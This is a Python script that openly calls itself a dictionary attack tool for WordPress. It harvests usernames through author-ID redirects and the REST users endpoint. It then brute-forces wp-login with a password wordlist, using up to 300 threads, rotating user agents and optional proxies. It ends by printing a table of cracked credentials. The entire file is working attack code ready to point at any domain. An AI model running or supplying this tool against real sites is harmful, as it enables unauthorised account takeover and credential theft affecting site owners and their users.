#!/usr/bin/python3
from random_user_agent.user_agent import UserAgent
from random_user_agent.params import SoftwareName, OperatingSystem
from colorama import Fore, Back, Style
import requests, argparse, pyfiglet
import random, bs4, threading, time
import tqdm, prettytable, os, platform
software_names = [SoftwareName.CHROME.value]
operating_systems = [OperatingSystem.WINDOWS.value, OperatingSystem.LINUX.value]   
user_agent_rotator = UserAgent(software_names=software_names, operating_systems=operating_systems, limit=100)
user_agent = lambda : user_agent_rotator.get_random_user_agent()
clear = lambda : 'clear' if 'linux' in platform.platform().lower() else 'cls'
parser = argparse.ArgumentParser()
parser.add_argument('--domain','-d', help='domain name or ip station', required=True, type=str)
parser.add_argument('--action','-a', help='select action [wp-login, wp-users, wp-hack]', required=True, type=str)
parser.add_argument('--wordlist','-w', help='list combo passwords', type=str, default='./passwords.txt')
parser.add_argument('--target','-t', help='URI Path WordPress', default='/', type=str)
parser.add_argument('--users','-u', help='users file list', type=str, default='./users.lst')
parser.add_argument('--ssl','-s', help='supporter ssl default HTTP for use ssl --sl true or -s true', type=str, default='http')
parser.add_argument('--proxies','-p', help='proxies 127.0.0.1:8080', default=None)
parser.add_argument('--Process','-P', help='select how many process use default 300', default=300, type=int)
parser.add_argument('--Sleep','-S', help='select sleep peer process default is 0.1', default=0.1, type=float)

class exploit_wp(object):
    def __init__(self, args):
        self.domain = args.domain
        self.wordlist = args.wordlist
        self.action = args.action
        self.target = args.target
        self.users = args.users
        self.proxies = args.proxies
        self.sleep_process = args.Sleep
        self.process = args.Process
        self.cookies = {'wordpress_test_cookie':'WP Cookie check'}
        self.login_list = list()
        self.users_hacked = list()
        self.list_threads = list()
        if not self.proxies is None:
            self.proxies = {'http':f'http://{self.proxies}', 'https':f'https://{self.proxies}'}
        if args.ssl == "true":
            self.ssl = "https"
        else:
            self.ssl = args.ssl
        

    def get_users(self, saved=True):
        users = list()
        print(Fore.GREEN + '[+] method : get users\n[+] start attack the users : author,wp-json')
        tables =  prettytable.PrettyTable()
        tables.field_names = ['usernames']
        for id in tqdm.tqdm(range(1, 21)):
            res = requests.get(f'{self.ssl}://{self.domain}{self.target}?author={id}', headers={'User-Agent': user_agent()}, proxies=self.proxies, cookies=self.cookies)
            if not f'?author={id}' in res.url:
                username = res.url[:-1].split("/")[-1]
                users.append(username)
                tables.add_row([username])
                
        res = requests.get(f'{self.ssl}://{self.domain}{self.target}wp-json/wp/v2/users', headers={'User-Agent': user_agent()}, proxies=self.proxies, cookies=self.cookies)
        for JSON in res.json():
            username = JSON['name']
            if not username in users:
                print(username)
                users.append(username)
                tables.add_row([username])
        os.system(clear())
        print(pyfiglet.figlet_format("Done", font='script'))
        print(tables)
        print(Fore.YELLOW + f'[+] total users : {len(users)}')
        if saved == True:
            with open(self.users, 'w+') as f:
                for user in users:
                    f.write(f'{user}\n')
            print(Fore.YELLOW + f'[+] saved list users : {self.users}')    
        return users

    def build_form(self):
        for loginP in ['wp-login.php', 'wp-admin', 'admin', 'administrator']:
            res = requests.get(f'{self.ssl}://{self.domain}{self.target}{loginP}', headers={'User-Agent': user_agent()}, proxies=self.proxies, cookies=self.cookies)
            params = dict()
            if res.status_code == 200:
                slice = bs4.BeautifulSoup(res.text, 'html.parser')
                for iteam in slice.find('form').find_all('input'):
                    try:
                        name, value = iteam.get("name"), iteam.get("value")
                        params[name] = value
                    except:
                        continue
                break
        return params, res.url
    def wp_login(self, users_list=False):
        form, url = self.build_form()
        if not os.path.isfile(self.wordlist):
            print(Fore.RED + f'[-] missing wordlist file -w')
            exit(404)
        if users_list == False:
            users_list = open(self.users, 'r').read().splitlines()
        passwords = open(self.wordlist, 'r', encoding="ISO-8859-1")
        count = 1
        while True:
            password = passwords.readline().replace('\n', '')
            form["pwd"] = password
            print(f'[+] login count : {count} | threadss : {threading.active_count()} | Password : {password}', end="\r")
            count += 1
            for username in users_list:
                form["log"] = username
                if len(self.users_hacked) == len(users_list):
                    self.PrintStyle(users_list)
                    exit(200)
                if username in self.users_hacked:
                    continue
                if password == '':
                    self.PrintStyle(users_list)
                    exit(200)
                    
                t = threading.Thread(target=self.login, args=(form, url, form["pwd"], form["log"]))
                #t.setDemon = True
                self.list_threads.append(t)
                t.start()
                time.sleep(self.sleep_process)
                if threading.active_count() == self.process:
                    while not threading.active_count() <= 2:
            	        for t in self.list_threads:
                            t.join()
                            print(f'wait seconed : {threading.active_count()}', end='\r')
        self.PrintStyle(users_list)
    def login(self, form, url, pwd, user):
        if requests.post(url, data=form, headers={'User-Agent': user_agent()}, proxies=self.proxies, cookies=self.cookies, allow_redirects=False).status_code == 302:
            self.users_hacked.append(user)
            self.login_list.append({'username':user, 'password':pwd})
            

    def PrintStyle(self, users_list):
        os.system(clear())
        print(pyfiglet.figlet_format("Done", font='script'))
        while not threading.active_count() <= 2:
            for t in self.list_threads:
                t.join()
                print(f'wait seconed : {threading.active_count()}', end='\r')
        tables = prettytable.PrettyTable()
        tables.field_names = ['UserName', 'Password', 'Hacked']
        for user in users_list:
            if user in self.users_hacked:
                for obj in self.login_list:
                    tables.add_row([obj["username"], obj["password"], "Yes"])
            else:
                tables.add_row([user, "None", "No"])
        print(tables)

    def process_hacked(self):
        users = self.get_users(saved=False)
        self.wp_login(users_list=users)

if __name__ == "__main__":
    args = parser.parse_args()
    use = exploit_wp(args)
    methods = {
        "wp-hack":{"name":"full wp-hack", "exploit":use.process_hacked},
        "wp-login":{"name":"wp-admin BF", "exploit":use.wp_login},
        "wp-users":{"name":"users eunm", "exploit":use.get_users}
    }
    os.system(clear())
    print(pyfiglet.figlet_format("Dictionary Attack WordPress", font='pagga'))
    if args.action in methods.keys():
        exploit = methods[args.action]
        print(f'[+] select payload : {exploit["name"]}')
        exploit["exploit"]() 
